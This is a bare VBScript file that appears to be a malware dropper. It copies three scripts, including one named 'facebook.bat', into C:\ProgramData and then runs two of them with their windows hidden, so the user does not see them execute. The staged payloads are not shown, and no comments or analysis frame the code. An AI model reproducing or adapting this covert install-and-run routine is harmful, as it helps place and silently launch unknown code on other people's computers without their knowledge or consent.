Option Explicit 
Dim oFSO, strstart, objShell, strstart2, WshShell
Set objShell = CreateObject("WScript.Shell") 
Set oFSO = CreateObject("Scripting.FileSystemObject") 
objShell.CurrentDirectory = oFSO.GetParentFolderName(WScript.ScriptFullName) 
strstart="C:\ProgramData\"
oFSO.CopyFile "facebook.bat", strstart, True
strstart="C:\ProgramData\"
oFSO.CopyFile "vbhidden.vbs", strstart, True
strstart="C:\ProgramData\"
oFSO.CopyFile "vbmover.bat", strstart, True
Set objShell = Nothing
Set oFSO = Nothing

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\ProgramData\vbmover.bat" & Chr(34), 0
Set WshShell = Nothing

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\ProgramData\vbhidden.vbs" & Chr(34), 0
Set WshShell = Nothing